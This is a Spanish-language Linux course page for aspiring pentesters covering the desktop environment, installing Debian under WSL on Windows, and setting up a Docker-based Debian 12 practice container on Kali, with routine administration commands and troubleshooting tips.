* 🔍 Buscar archivos por nombre

* 📋 Copiar/pegar rutas de archivos

* 👁️ Vista previa de imágenes y documentos

* 🗜️ Comprimir/descomprimir archivos (.zip, .tar.gz, etc.)

* 🔐 Ver y cambiar permisos de archivos (click derecho → Propiedades)

> [!warning] 💡 Exploradores según el Entorno
>
>             Thunar  - XFCE (Kali Linux)
>             Nautilus  (Files) - GNOME (Ubuntu)
>             Dolphin  - KDE Plasma
>             Nemo  - Cinnamon (Linux Mint)
>             PCManFM  - LXDE (muy ligero)

### 🔑 Acceso Rápido a Directorios Importantes

En la barra lateral del explorador suele haber accesos rápidos:

* 🏠 Home - Tu directorio personal (`/home/tu_usuario`)

* 💾 Desktop - Escritorio (`/home/tu_usuario/Desktop`)

* 📥 Downloads - Descargas (`/home/tu_usuario/Downloads`)

* 📄 Documents - Documentos (`/home/tu_usuario/Documents`)

* 🖼️ Pictures - Imágenes (`/home/tu_usuario/Pictures`)

* 🎵 Music - Música (`/home/tu_usuario/Music`)

* 🎬 Videos - Vídeos (`/home/tu_usuario/Videos`)

* 💿 Dispositivos - USBs, discos externos montados

> [!warning] ⚠️ Archivos Ocultos
>          Por defecto, el explorador  NO muestra archivos ocultos  (archivos que empiezan con un punto, como `.bashrc`).
>           Para mostrarlos:  Presiona  Ctrl + H  o ve a Ver → "Mostrar archivos ocultos"

## 📦 Centro de Aplicaciones / Software Manager

### 🛍️ Instalación Gráfica de Software

Las distribuciones Linux modernas incluyen una **tienda de aplicaciones** donde puedes buscar e instalar software con un simple clic:

* GNOME Software - Ubuntu, Fedora, Debian

* Discover - KDE Plasma

* Software Manager - Linux Mint

> [!warning] ⚠️ En Kali Linux
>          Kali Linux  NO tiene un centro de aplicaciones gráfico tradicional . Esto es intencional porque:
>
>            Kali está diseñado para pentesters profesionales que usan la terminal
>            Todas las herramientas de pentesting ya vienen preinstaladas
>            Si necesitas instalar algo, usas `apt` desde la terminal

### 📦 Gestión de Paquetes (Vista Previa)

Aunque en este módulo vemos la GUI, es importante saber que en Linux la instalación de software se hace principalmente desde la terminal con **gestores de paquetes**:

* apt / apt-get - Debian, Ubuntu, Kali Linux

* dnf / yum - Fedora, Red Hat, CentOS

* pacman - Arch Linux

* zypper - openSUSE

En el **Módulo 5 (Comandos Básicos)** veremos a fondo cómo usar `apt` para instalar, actualizar y eliminar paquetes.

## ⌨️ Widgets y Barra de Herramientas

### 🔧 Panel Superior/Inferior

La barra de herramientas (panel) suele contener:

#### 🚀 Lanzador de Aplicaciones

Menú de inicio para acceder a todas las aplicaciones instaladas.

#### 🪟 Lista de Ventanas

Muestra ventanas abiertas, permite cambiar entre ellas.

#### 🌐 Red

Estado de conexión, configuración rápida de WiFi/Ethernet.

#### 🔊 Volumen

Control de volumen del sistema.

#### 🔋 Batería

Estado de batería (en portátiles).

#### 🕐 Reloj y Calendario

Fecha y hora actual.

#### ⚙️ Acceso Rápido

Configuración, apagado, cerrar sesión.

#### 🔔 Notificaciones

Alertas del sistema, actualizaciones disponibles.

**Personalización del Panel:**

* Click derecho en el panel → "Propiedades del Panel"

* Añade o quita widgets (applets)

* Cambia posición (arriba, abajo, laterales)

* Ajusta tamaño y transparencia

## 🎯 Conclusión del Módulo

> [!warning] 💡 Resumen
>        Hemos visto una  introducción rápida  al entorno gráfico de Linux:
>
>          ✅ Qué es un entorno de escritorio (GNOME, KDE, XFCE)
>          ✅ Aplicaciones gráficas básicas (explorador, terminal, configuración)
>          ✅ Monitor del sistema y gestión de procesos visual
>          ✅ Configuración de red desde la GUI
>          ✅ Explorador de archivos y navegación visual
>          ✅ Centro de aplicaciones (cuando existe)
>          ✅ Widgets y personalización del panel
>
>
>        ⚡ A partir de Ahora: Terminal 100%
>        Este es el  último módulo con interfaz gráfica . A partir del Módulo 3, todo lo que hagamos será desde la  terminal / línea de comandos .
>         ¿Por qué?
>
>          🎯 La mayoría de servidores Linux NO tienen entorno gráfico
>          🎯 Las herramientas de pentesting se usan desde terminal
>          🎯 La terminal es más rápida, potente y automatizable
>          🎯 En pentesting accederás a sistemas remotos solo por SSH (solo terminal)
>
>
>         Próximo módulo:  Estructura del Sistema de Archivos (FHS) 📂

  ← Volver al Índice

Módulo - Entorno Gráfico - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🛠️ Parte 3: Despliegue del Laboratorio en Windows (WSL)

# Instalación de Debian en WSL

Windows Subsystem for Linux - Tu primer entorno Linux

  ← Volver al Índice

## 🎯 ¿Qué es WSL?

**WSL (Windows Subsystem for Linux)** es una característica de Windows 10/11 que permite ejecutar un entorno Linux completo directamente en Windows, sin necesidad de máquinas virtuales o dual boot.

#### ✅ Ventajas de WSL para Aprender Linux

* 🚀 Instalación rápida - En menos de 10 minutos tienes Linux funcionando

* 💻 Sin configuración compleja - No necesitas particionar disco ni configurar BIOS

* 🔄 Integración con Windows - Accede a tus archivos de Windows desde Linux y viceversa

* ⚡ Rendimiento nativo - WSL2 usa un kernel Linux real, muy rápido

* 📚 Perfecto para aprender - Terminal Linux real, ideal para practicar comandos

* 💾 Consume pocos recursos - Más ligero que una máquina virtual

* 🔧 Fácil de resetear - Si rompes algo, reinstalar es trivial

#### 📋 Requisitos Previos

* ✅ Windows 10 versión 2004 o superior (Build 19041+) o Windows 11

* ✅ Arquitectura de 64 bits (x64)

* ✅ Mínimo 4GB de RAM (recomendado 8GB)

* ✅ Virtualización habilitada en BIOS/UEFI

* ✅ Permisos de administrador en Windows

### 🔍 Verificar Versión de Windows

# Presiona Win + R, escribe: winver y presiona Enter
# O ejecuta en PowerShell:
PS C:\Users\Usuario> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22631 N/A Build 22631

## 🛠️ Instalación Paso a Paso

      1

### Habilitar WSL

Abre **PowerShell como Administrador**:

* Presiona Win + X

* Selecciona "Windows PowerShell (Administrador)" o "Terminal (Administrador)"

Ejecuta el siguiente comando:

# Instalar WSL con un solo comando (Windows 10/11 moderno):
PS C:\Windows\system32> wsl --install

Instalando: Plataforma de máquina virtual
Instalando: Plataforma del Subsistema de Windows para Linux
Descargando: WSL Kernel
Descargando: GUI App Support
La operación se realizó correctamente.
Se requiere reiniciar el equipo para completar la instalación.

#### ⚠️ Importante

**Reinicia tu computadora** después de este paso. Es obligatorio para que WSL se active correctamente.

**Si tienes una versión antigua de Windows 10:**

# Método alternativo (si wsl --install no funciona):
PS C:\Windows\system32> dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
PS C:\Windows\system32> dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart

      2

### Configurar WSL2 como Versión Predeterminada

Después de reiniciar, abre de nuevo PowerShell como administrador:

# Establecer WSL2 como versión predeterminada:
PS C:\Windows\system32> wsl --set-default-version 2
Para obtener información sobre las diferencias principales con WSL 2, visite https://aka.ms/wsl2
La operación se completó correctamente.

> [!warning] 💡 WSL1 vs WSL2
>           WSL2  es la versión recomendada porque:
>
>            Usa un kernel Linux real (mejor compatibilidad)
>            Rendimiento de I/O mucho más rápido
>            Compatibilidad completa con llamadas del sistema
>            Soporta Docker nativo

      3

### Instalar Debian

Desde PowerShell, primero verifica las distribuciones disponibles:

# Ver distribuciones disponibles:
PS C:\Users\Usuario> wsl --list --online

Las siguientes es una lista de las distribuciones válidas que se pueden instalar.
Instala mediante 'wsl --install -d <Distro>'.

NAME                                   FRIENDLY NAME
Ubuntu                                 Ubuntu
Debian                                 Debian GNU/Linux
kali-linux                             Kali Linux Rolling
Ubuntu-18.04                           Ubuntu 18.04 LTS
Ubuntu-20.04                           Ubuntu 20.04 LTS
Ubuntu-22.04                           Ubuntu 22.04 LTS
OracleLinux_7_9                        Oracle Linux 7.9
OracleLinux_8_7                        Oracle Linux 8.7
OracleLinux_9_1                        Oracle Linux 9.1
openSUSE-Leap-15.5                     openSUSE Leap 15.5
SUSE-Linux-Enterprise-Server-15-SP4   SUSE Linux Enterprise Server 15 SP4
SUSE-Linux-Enterprise-15-SP5          SUSE Linux Enterprise 15 SP5
openSUSE-Tumbleweed                    openSUSE Tumbleweed

# Instalar Debian:
PS C:\Users\Usuario> wsl --install -d Debian

Instalando: Debian GNU/Linux
Debian GNU/Linux se ha instalado.
Iniciando Debian GNU/Linux...

> [!warning] 💡 Nota
>          La instalación descargará aproximadamente 400-500 MB. Asegúrate de tener buena conexión a internet.

      4

### Primera Configuración de Debian

Una vez instalado, abre Debian desde el menú inicio o ejecuta:

PS C:\Users\Usuario> wsl -d Debian

La primera vez te pedirá crear un usuario y contraseña:

Installing, this may take a few minutes...
Please create a default UNIX user account. The username does not need to match your Windows username.
For more information visit: https://aka.ms/wslusers
Enter new UNIX username: tecnico
New password: (escribe tu contraseña - no se verá mientras escribes)
Retype new password: (repite la contraseña)
passwd: password updated successfully
Installation successful!
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

tecnico@DESKTOP-PC:~$ # ¡Ya estás en Linux!

> [!warning] 💡 Importante sobre el Usuario
>
>            Este usuario tendrá privilegios `sudo` (administrador)
>            La contraseña se te pedirá cuando uses comandos con `sudo`
>            Elige una contraseña que recuerdes, pero segura
>            El username puede ser diferente al de Windows

      5

### Actualizar el Sistema

Lo primero que debes hacer en cualquier instalación de Linux es actualizar los paquetes:

# Actualizar lista de paquetes:
tecnico@DESKTOP-PC:~$ sudo apt update
[sudo] password for tecnico: (escribe tu contraseña)
Hit:1 http://deb.debian.org/debian bookworm InRelease
Get:2 http://deb.debian.org/debian bookworm-updates InRelease [55.4 kB]
Get:3 http://security.debian.org/debian-security bookworm-security InRelease [48.0 kB]
...
Fetched 15.2 MB in 5s (3,045 kB/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.

# Actualizar paquetes instalados:
tecnico@DESKTOP-PC:~$ sudo apt upgrade -y
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  base-files bash libc6 systemd
4 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
...

# Instalar herramientas básicas útiles:
tecnico@DESKTOP-PC:~$ sudo apt install -y curl wget git vim nano net-tools
Reading package lists... Done
Building dependency tree... Done
...
Setting up curl (7.88.1-10+deb12u5) ...
Setting up git (1:2.39.2-1.1) ...
...

#### ✅ Herramientas Instaladas

* `curl`, `wget` - Descargar archivos desde internet

* `git` - Control de versiones

* `vim`, `nano` - Editores de texto en terminal

* `net-tools` - Herramientas de red (ifconfig, netstat)

      6

### Verificar la Instalación

Comprueba que todo funciona correctamente:

# Ver versión de Debian:
tecnico@DESKTOP-PC:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
...

# Ver versión del kernel:
tecnico@DESKTOP-PC:~$ uname -r
5.15.133.1-microsoft-standard-WSL2

# Ver usuario actual:
tecnico@DESKTOP-PC:~$ whoami
tecnico

# Ver tu directorio actual:
tecnico@DESKTOP-PC:~$ pwd
/home/tecnico

# Probar comando con sudo:
tecnico@DESKTOP-PC:~$ sudo ls /root
[sudo] password for tecnico:

## 🔧 Uso Básico de WSL

### Abrir Debian

#### Opción 1: Desde el Menú Inicio

Busca "Debian" en el menú inicio y haz clic.

#### Opción 2: Desde PowerShell/CMD

# Abrir tu distribución predeterminada:
PS C:\Users\Usuario> wsl

# Abrir Debian específicamente:
PS C:\Users\Usuario> wsl -d Debian

# Ejecutar un comando directo:
PS C:\Users\Usuario> wsl ls -la

#### Opción 3: Desde Windows Terminal

Si tienes Windows Terminal instalado, Debian aparecerá como una pestaña disponible.

### Acceder a Archivos

#### Acceder a Windows desde Linux

Tus discos de Windows están montados en `/mnt/`:

# Ver discos de Windows:
tecnico@DESKTOP-PC:~$ ls /mnt/
c  d  e

# Ir a tu carpeta de usuario de Windows:
tecnico@DESKTOP-PC:~$ cd /mnt/c/Users/Usuario/
tecnico@DESKTOP-PC:/mnt/c/Users/Usuario$ ls
Desktop  Documents  Downloads  Pictures  Videos

# Copiar un archivo de Windows a Linux:
tecnico@DESKTOP-PC:~$ cp /mnt/c/Users/Usuario/Downloads/archivo.txt ~/

#### Acceder a Linux desde Windows

Abre el Explorador de Windows y escribe en la barra de direcciones:

\\wsl$\Debian\home\tecnico

O accede directamente desde el explorador de archivos en la sección "Linux" (Windows 11).

### Comandos Útiles de WSL (desde PowerShell)

# Listar distribuciones instaladas:
PS C:\Users\Usuario> wsl --list --verbose
  NAME      STATE           VERSION
* Debian    Running         2

# Detener Debian:
PS C:\Users\Usuario> wsl --terminate Debian

# Detener todas las distribuciones:
PS C:\Users\Usuario> wsl --shutdown

# Establecer Debian como predeterminada:
PS C:\Users\Usuario> wsl --set-default Debian

# Ver versión de WSL:
PS C:\Users\Usuario> wsl --version
Versión de WSL: 2.0.14.0
Versión de kernel: 5.15.133.1
Versión de WSLg: 1.0.59

# Actualizar WSL:
PS C:\Users\Usuario> wsl --update

## 🎯 Próximos Pasos

#### ✅ ¡Ya tienes Debian en WSL funcionando!

Ahora puedes:

* 📚 Seguir los módulos del curso - Practica todos los comandos en tu terminal Debian

* 🔧 Instalar herramientas - Usa `apt install` para agregar software

* 💻 Programar - Instala Python, Node.js, PHP, etc.

* 🌐 Aprender redes - Experimenta con comandos de red

* 📝 Crear scripts - Automatiza tareas con Bash

> [!warning] 🚀 Cuando estés listo para Pentesting
>        Una vez que domines los comandos básicos de Linux en Debian (Módulos 2-8), pasaremos a instalar  Kali Linux  en una máquina virtual, que incluye todas las herramientas de hacking ético y pentesting.
>        Debian en WSL es perfecto para  aprender y practicar , pero para pentesting profesional necesitarás Kali con todas sus herramientas especializadas.

## ❓ Solución de Problemas

#### Error: "WSL 2 requires an update to its kernel component"

**Solución:** Descarga e instala el paquete de actualización del kernel de Linux de WSL2:

🔗 https://aka.ms/wsl2kernel

#### Error: "Virtualización no habilitada"

**Solución:** Debes habilitar la virtualización en tu BIOS/UEFI:

* Reinicia tu PC y entra a BIOS/UEFI (generalmente F2, F10, F12 o DEL al iniciar)

* Busca opciones como "Virtualization Technology", "Intel VT-x" o "AMD-V"

* Actívala (Enable)

* Guarda cambios y reinicia

#### Debian no inicia / Pantalla en blanco

**Solución:** Reinicia WSL desde PowerShell:

PS C:\Users\Usuario> wsl --shutdown
PS C:\Users\Usuario> wsl -d Debian

#### Olvidé mi contraseña de Linux

**Solución:** Resetear la contraseña desde PowerShell:

# Establecer root como usuario predeterminado temporalmente:
PS C:\Users\Usuario> debian config --default-user root

# Abrir Debian (ahora eres root):
PS C:\Users\Usuario> wsl -d Debian

# Cambiar contraseña del usuario:
root@DESKTOP-PC:~# passwd tecnico
New password:
Retype new password:
passwd: password updated successfully

# Salir y restaurar usuario normal:
root@DESKTOP-PC:~# exit
PS C:\Users\Usuario> debian config --default-user tecnico

#### Quiero eliminar Debian y empezar de cero

**Solución:** Desregistrar la distribución:

# Ver distribuciones instaladas:
PS C:\Users\Usuario> wsl --list
Debian (Predeterminado)

# Desregistrar (BORRA TODO):
PS C:\Users\Usuario> wsl --unregister Debian
Anulando el registro...

# Reinstalar desde cero:
PS C:\Users\Usuario> wsl --install -d Debian

**⚠️ Esto borrará todos tus datos en Debian.** Haz backup si tienes archivos importantes.

## 📚 Recursos Adicionales

* 📖 Documentación oficial de WSL: https://learn.microsoft.com/es-es/windows/wsl/

* 📖 Documentación de Debian: https://www.debian.org/doc/

* 🎥 Guía oficial de Microsoft: Instalación de WSL

* 💬 Comunidad Debian: https://www.debian.org/support

  ← Volver al Índice

Instalación de Debian en WSL - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🐳 Parte 4: Despliegue del Laboratorio Aislado en Docker

# Instalación de Docker en Kali Linux

Entorno Debian 12 containerizado para el curso

  ← Volver al Índice

## 🐳 Instalación de Docker en Kali Linux

      1

### Instalar Docker

Abre una terminal en Kali Linux e instala Docker con los siguientes comandos:

# Actualizar repositorios:
┌──(kali㉿kali)-[~]
└─$ sudo apt update

# Instalar Docker:
┌──(kali㉿kali)-[~]
└─$ sudo apt install -y docker.io

Reading package lists... Done
Building dependency tree... Done
...
Setting up docker.io (24.0.7+dfsg1-4) ...

# Iniciar el servicio Docker:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl start docker

# Habilitar Docker para que inicie automáticamente:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl enable docker

# Añadir tu usuario al grupo docker (para no usar sudo cada vez):
┌──(kali㉿kali)-[~]
└─$ sudo usermod -aG docker $USER

# Aplicar cambios (o cierra sesión y vuelve a entrar):
┌──(kali㉿kali)-[~]
└─$ newgrp docker

      2

### Verificar Instalación

# Verificar versión de Docker:
┌──(kali㉿kali)-[~]
└─$ docker --version

Docker version 24.0.7, build 24.0.7-0ubuntu4

# Verificar que Docker está corriendo:
┌──(kali㉿kali)-[~]
└─$ docker ps

CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

Si ves la versión y no hay errores, ¡Docker está instalado correctamente! 🎉

## 📦 Descargar Archivos del Curso

#### 📥 Archivos Necesarios

Descarga los siguientes archivos para crear tu entorno Debian 12:

* Dockerfile - Receta para construir la imagen Debian 12

* docker-menu.sh - Script de gestión con menú interactivo

      📄 Descargar Dockerfile
      🔧 Descargar docker-menu.sh

$ wget https://cursosmfr.es/ifct0109/linux/archivos/Dockerfile
$ wget https://cursosmfr.es/ifct0109/linux/archivos/docker-menu.sh

      3

### Preparar los Archivos

# Crear directorio para el proyecto:
┌──(kali㉿kali)-[~]
└─$ mkdir ~/debian-docker
┌──(kali㉿kali)-[~]
└─$ cd ~/debian-docker

# Mover los archivos descargados aquí:
┌──(kali㉿kali)-[~/debian-docker]
└─$ mv ~/Downloads/Dockerfile .
┌──(kali㉿kali)-[~/debian-docker]
└─$ mv ~/Downloads/docker-menu.sh .

# Dar permisos de ejecución al script:
┌──(kali㉿kali)-[~/debian-docker]
└─$ chmod +x docker-menu.sh

# Verificar que están los archivos:
┌──(kali㉿kali)-[~/debian-docker]
└─$ ls -l

-rw-r--r-- 1 kali kali  456 Feb  7 10:00 Dockerfile
-rwxr-xr-x 1 kali kali 2048 Feb  7 10:01 docker-menu.sh

## 🚀 Usar el Menú de Docker

      4

### Ejecutar el Script de Gestión

El script `docker-menu.sh` te proporciona un menú interactivo para gestionar tu contenedor Debian:

# Ejecutar el menú:
┌──(kali㉿kali)-[~/debian-docker]
└─$ ./docker-menu.sh

╔════════════════════════════════════════╗
║   GESTIÓN DOCKER - DEBIAN 12 CURSO     ║
╚════════════════════════════════════════╝

1) Build imagen debian12
2) Iniciar docker
3) Limpiar espacio Docker
4) Mostrar espacio ocupado
5) Eliminar imagen
6) Salir

Selecciona una opción:

### 📋 Opciones del Menú

**1. Build imagen debian12**

Construye la imagen Docker basada en Debian 12 con todas las herramientas del curso instaladas.

* Usuario creado: `tecnico`

* Contraseña: `SegInf`

* Incluye: curl, wget, git, vim, nano, net-tools, iputils-ping, etc.

**2. Iniciar docker**

Inicia un contenedor temporal basado en la imagen `mi-debian12:latest`. Al salir, el contenedor se elimina automáticamente (`--rm`).

**3. Limpiar espacio Docker**

Elimina cachés y builds antiguos de Docker para liberar espacio en disco.

**4. Mostrar espacio ocupado**

Muestra cuánto espacio está usando Docker en tu sistema.

**5. Eliminar imagen**

Elimina completamente la imagen `mi-debian12`. Útil si quieres reconstruirla desde cero.

## 🎯 Uso Recomendado

#### ✅ Workflow Diario

* Primera vez: Ejecuta opción `1` (Build imagen) - Tarda 2-5 minutos

* Para practicar: Ejecuta opción `2` (Iniciar docker)

* 🎓 Practicas los comandos del curso dentro del contenedor

* Cuando termines, escribe `exit` para salir

* El contenedor se elimina automáticamente (es temporal)

* Próxima sesión: Repite desde el paso 2

> [!warning] 💡 Importante
>         El contenedor es temporal (`--rm`).  Esto significa que cuando salgas con `exit`, todos los cambios que hiciste dentro del contenedor se perderán.
>         ¿Por qué?  Para que siempre tengas un entorno limpio y sin errores acumulados. Es perfecto para practicar.
>         Si quieres guardar archivos:  Guárdalos en tu Kali y luego cópialos al contenedor cuando lo necesites, o usa volúmenes (tema avanzado).

## 📚 Comandos Básicos de Docker

> [!warning] 💡 Referencia Rápida
>        Aquí tienes los comandos más útiles de Docker para gestionar contenedores e imágenes manualmente (sin usar el script).

### 📦 Gestión de Imágenes

# Listar todas las imágenes descargadas/construidas:
┌──(kali㉿kali)-[~]
└─$ docker images

REPOSITORY     TAG       IMAGE ID       CREATED         SIZE
mi-debian12    latest    a1b2c3d4e5f6   10 minutes ago  345MB
debian         12        8926993d8a4e   2 weeks ago     117MB

# Ver imágenes con más detalles (formato largo):
┌──(kali㉿kali)-[~]
└─$ docker images --no-trunc

# Ver solo los IDs de las imágenes:
┌──(kali㉿kali)-[~]
└─$ docker images -q

a1b2c3d4e5f6
8926993d8a4e

# Eliminar una imagen específica:
┌──(kali㉿kali)-[~]
└─$ docker rmi mi-debian12

Untagged: mi-debian12:latest
Deleted: sha256:a1b2c3d4e5f6...

# Eliminar imagen por ID:
┌──(kali㉿kali)-[~]
└─$ docker rmi a1b2c3d4e5f6

# Eliminar TODAS las imágenes no utilizadas (¡cuidado!):
┌──(kali㉿kali)-[~]
└─$ docker image prune -a

WARNING! This will remove all images without at least one container associated to them.
Are you sure you want to continue? [y/N] y

# Forzar eliminación (sin confirmación):
┌──(kali㉿kali)-[~]
└─$ docker rmi -f mi-debian12

### 🐳 Gestión de Contenedores

# Listar contenedores EN EJECUCIÓN:
┌──(kali㉿kali)-[~]
└─$ docker ps

CONTAINER ID   IMAGE                  COMMAND       CREATED        STATUS        NAMES
f1a2b3c4d5e6   mi-debian12:latest     "/bin/bash"   5 minutes ago  Up 5 minutes  vibrant_tesla

# Listar TODOS los contenedores (activos y detenidos):
┌──(kali㉿kali)-[~]
└─$ docker ps -a

CONTAINER ID   IMAGE                  COMMAND       CREATED         STATUS                     NAMES
f1a2b3c4d5e6   mi-debian12:latest     "/bin/bash"   5 minutes ago   Up 5 minutes               vibrant_tesla
a9b8c7d6e5f4   mi-debian12:latest     "/bin/bash"   1 hour ago      Exited (0) 30 minutes ago  silly_newton

# Ver solo los IDs de contenedores:
┌──(kali㉿kali)-[~]
└─$ docker ps -q

f1a2b3c4d5e6

# Ver el último contenedor creado:
┌──(kali㉿kali)-[~]
└─$ docker ps -l

# Detener un contenedor en ejecución:
┌──(kali㉿kali)-[~]
└─$ docker stop f1a2b3c4d5e6

# O usar el nombre del contenedor:
┌──(kali㉿kali)-[~]
└─$ docker stop vibrant_tesla

# Detener TODOS los contenedores en ejecución:
┌──(kali㉿kali)-[~]
└─$ docker stop $(docker ps -q)

# Eliminar un contenedor detenido:
┌──(kali㉿kali)-[~]
└─$ docker rm f1a2b3c4d5e6

# Eliminar un contenedor aunque esté corriendo (forzar):
┌──(kali㉿kali)-[~]
└─$ docker rm -f f1a2b3c4d5e6

# Eliminar TODOS los contenedores detenidos:
┌──(kali㉿kali)-[~]
└─$ docker container prune

WARNING! This will remove all stopped containers.
Are you sure you want to continue? [y/N] y

# Eliminar contenedores detenidos sin confirmación:
┌──(kali㉿kali)-[~]
└─$ docker container prune -f

### 🔍 Inspección y Logs

# Ver logs de un contenedor:
┌──(kali㉿kali)-[~]
└─$ docker logs f1a2b3c4d5e6

╔════════════════════════════════════════════════════════════╗
║  Bienvenido al Curso de Linux para Pentesting            ║
...

# Ver logs en tiempo real (seguir):
┌──(kali㉿kali)-[~]
└─$ docker logs -f f1a2b3c4d5e6

# Ver información detallada de un contenedor:
┌──(kali㉿kali)-[~]
└─$ docker inspect f1a2b3c4d5e6

# Ver estadísticas de uso (CPU, RAM, red):
┌──(kali㉿kali)-[~]
└─$ docker stats

CONTAINER ID   NAME            CPU %   MEM USAGE / LIMIT   MEM %   NET I/O
f1a2b3c4d5e6   vibrant_tesla   0.02%   15.5MiB / 7.7GiB    0.19%   656B / 0B

# Ver estadísticas de un contenedor específico:
┌──(kali㉿kali)-[~]
└─$ docker stats f1a2b3c4d5e6

# Ver procesos corriendo dentro del contenedor:
┌──(kali㉿kali)-[~]
└─$ docker top f1a2b3c4d5e6

UID    PID     PPID    C   STIME   TTY   TIME       CMD
tecnico 12345  12344   0   10:30   pts/0 00:00:00   /bin/bash

### 🧹 Limpieza del Sistema

# Ver espacio usado por Docker:
┌──(kali㉿kali)-[~]
└─$ docker system df

TYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLE
Images          5         2         2.5GB     1.8GB (72%)
Containers      10        1         125MB     100MB (80%)
Local Volumes   3         1         500MB     400MB (80%)
Build Cache     25        0         3.2GB     3.2GB (100%)

# Limpiar TODO lo no utilizado (¡CUIDADO!):
┌──(kali㉿kali)-[~]
└─$ docker system prune

WARNING! This will remove:
  - all stopped containers
  - all networks not used by at least one container
  - all dangling images
  - all dangling build cache
Are you sure you want to continue? [y/N]

# Limpiar TODO incluyendo imágenes no usadas:
┌──(kali㉿kali)-[~]
└─$ docker system prune -a

# Limpiar sin confirmación (forzar):
┌──(kali㉿kali)-[~]
└─$ docker system prune -a -f

# Limpiar solo la caché de builds:
┌──(kali㉿kali)-[~]
└─$ docker builder prune

# Limpiar volúmenes no usados:
┌──(kali㉿kali)-[~]
└─$ docker volume prune

### 🚀 Otros Comandos Útiles

# Entrar a un contenedor en ejecución:
┌──(kali㉿kali)-[~]
└─$ docker exec -it f1a2b3c4d5e6 /bin/bash

# Ejecutar un comando dentro del contenedor sin entrar:
┌──(kali㉿kali)-[~]
└─$ docker exec f1a2b3c4d5e6 ls -la /home/tecnico

total 24
drwxr-xr-x 2 tecnico tecnico 4096 Feb  7 10:00 .
drwxr-xr-x 3 root    root    4096 Feb  7 09:55 ..

# Copiar archivo DEL host AL contenedor:
┌──(kali㉿kali)-[~]
└─$ docker cp archivo.txt f1a2b3c4d5e6:/home/tecnico/

# Copiar archivo DEL contenedor AL host:
┌──(kali㉿kali)-[~]
└─$ docker cp f1a2b3c4d5e6:/home/tecnico/archivo.txt ./

# Reiniciar un contenedor:
┌──(kali㉿kali)-[~]
└─$ docker restart f1a2b3c4d5e6

# Pausar un contenedor (congelar procesos):
┌──(kali㉿kali)-[~]
└─$ docker pause f1a2b3c4d5e6

# Reanudar un contenedor pausado:
┌──(kali㉿kali)-[~]
└─$ docker unpause f1a2b3c4d5e6

# Ver versión de Docker:
┌──(kali㉿kali)-[~]
└─$ docker version

Client: Docker Engine - Community
 Version:           24.0.7
 API version:       1.43
...

#### 💡 Trucos Útiles

* Usar nombres en lugar de IDs: Puedes usar el nombre del contenedor (ej: `vibrant_tesla`) en lugar del ID largo

* IDs cortos: Solo necesitas los primeros 3-4 caracteres del ID (ej: `f1a2` en lugar de `f1a2b3c4d5e6`)

* Autocompletar: Usa Tab después de escribir `docker` para ver comandos disponibles

* Ayuda rápida: `docker COMANDO --help` muestra ayuda de cualquier comando

* Filtrar resultados: `docker ps -a --filter "status=exited"` muestra solo contenedores detenidos

## ❓ Solución de Problemas

#### Error: "permission denied"

**Solución:** No añadiste tu usuario al grupo docker o no aplicaste los cambios.

┌──(kali㉿kali)-[~]
└─$ sudo usermod -aG docker $USER
┌──(kali㉿kali)-[~]
└─$ newgrp docker
# O cierra sesión y vuelve a entrar

#### Error: "Cannot connect to Docker daemon"

**Solución:** Docker no está corriendo.

┌──(kali㉿kali)-[~]
└─$ sudo systemctl start docker
┌──(kali㉿kali)-[~]
└─$ sudo systemctl status docker

#### La imagen ocupa mucho espacio

**Solución:** Usa la opción 3 del menú para limpiar cachés.

┌──(kali㉿kali)-[~/debian-docker]
└─$ ./docker-menu.sh
# Selecciona opción 3

  ← Volver al Índice

Instalación de Docker en Kali Linux - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🔗 Navegación y Siguiente Módulo
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
* 📁 Siguiente: [[02 - MODULOS/Prácticas (PoCs)/Linux/02 - Curso de Linux - Estructura de Archivos (FHS)|Módulo 2: Estructura del Sistema de Archivos (FHS)]]
